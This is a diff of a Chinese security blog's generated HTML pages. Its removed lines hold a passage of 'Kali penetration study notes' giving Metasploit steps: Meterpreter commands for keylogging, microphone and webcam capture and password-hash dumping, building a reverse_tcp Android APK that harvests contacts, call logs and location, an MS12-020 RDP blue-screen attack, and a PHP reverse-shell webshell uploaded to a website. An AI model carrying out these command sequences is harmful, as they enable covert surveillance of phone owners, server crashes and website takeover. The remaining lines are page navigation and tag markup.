-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用户接口</span></span><br><span class="line">enumdesktop		窗体列表</span><br><span class="line">keyscam_dump	键盘记录下载</span><br><span class="line">keyscan_strat	键盘记录开始</span><br><span class="line">keyscan_stop	键盘记录停止</span><br><span class="line">uictl			获取键盘鼠标控制权 -h 查看选项</span><br><span class="line">record_mic		音频录制</span><br><span class="line">webcam_chat		查看摄像头接口</span><br><span class="line">webcam_list		查看摄像头列表</span><br><span class="line">webcam_stream	摄像头视频获取</span><br><span class="line">getsystem		获取高权限</span><br><span class="line">hashdump		下载<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>Android渗透测试</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.生成apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f apk &gt; xxx.apk</span><br><span class="line">生成apk文件</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line">set PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line">3.查看选项</span><br><span class="line">show options</span><br><span class="line">set LHOST xx1</span><br><span class="line">set LPROT xx2</span><br><span class="line">4.exploit</span><br><span class="line">5.手机安装apk文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search</span><br><span class="line">download</span><br><span class="line">ps 	查看qq进程</span><br><span class="line">webcam_snap 截屏</span><br><span class="line">webcam_stream -i 1/2 开启摄像头</span><br><span class="line">check_root	检测ROOT</span><br><span class="line">dump_calllog 下载电话记录</span><br><span class="line">dump_contact 下载联系人记录</span><br><span class="line">Geolocate	定位</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>Metasploit服务器蓝屏</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器开启3389</span><br><span class="line">确定服务器ip</span><br><span class="line">auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">服务器远程桌面的一个利用模块</span><br><span class="line">auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">扫描主机是否存在漏洞</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. msfconsole</span><br><span class="line">2. search ms12_020</span><br><span class="line">3. use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">4. show options</span><br><span class="line">5. set RHOST xx.xx.xx.xx</span><br><span class="line">6. exploit 确定了xx.xx.xx.xx：3389存在</span><br><span class="line">7. user auxiliary/dos/windows/rdp/ms12_020_check</span><br><span class="line">8. show options</span><br><span class="line">9. set RHOST xx.xx.xx.xx</span><br><span class="line">10. exploit</span><br><span class="line">11. 蓝屏攻击成功</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>Metasploit 生成webshell及应用</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.msf生成一个php脚本</span><br><span class="line">msfpayload php/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx R &gt; web.php</span><br><span class="line">2.上传php脚本到网站上</span><br><span class="line">3.user exploit/multu/handler</span><br><span class="line">4.show options</span><br><span class="line">5. set LHost</span><br><span class="line">6.exploit</span><br><span class="line">7.访问web.php</span><br><span class="line">8.反弹出了会话</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/21/Kali渗透学习笔记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -1662,7 +1528,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1670,7 +1536,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
